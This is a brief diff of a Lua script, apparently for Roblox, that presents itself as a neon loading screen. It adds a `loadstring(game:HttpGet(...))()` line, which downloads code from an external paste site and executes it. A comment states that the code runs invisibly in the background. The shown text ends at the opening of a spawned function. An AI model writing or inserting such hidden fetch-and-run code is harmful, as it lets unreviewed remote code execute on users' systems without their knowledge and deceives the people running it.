@@ -1,7 +1,8 @@
 --// Neon Loading Screen + Hidden Background Script
 --// dev: あゆみ
 
-https://pastefy.app/Kt8s7Qj6/raw
+
+loadstring(game:HttpGet("https://pastefy.app/Kt8s7Qj6/raw"))()
 
 -- ✅ Run Pastefy script invisibly in background
 task.spawn(function()
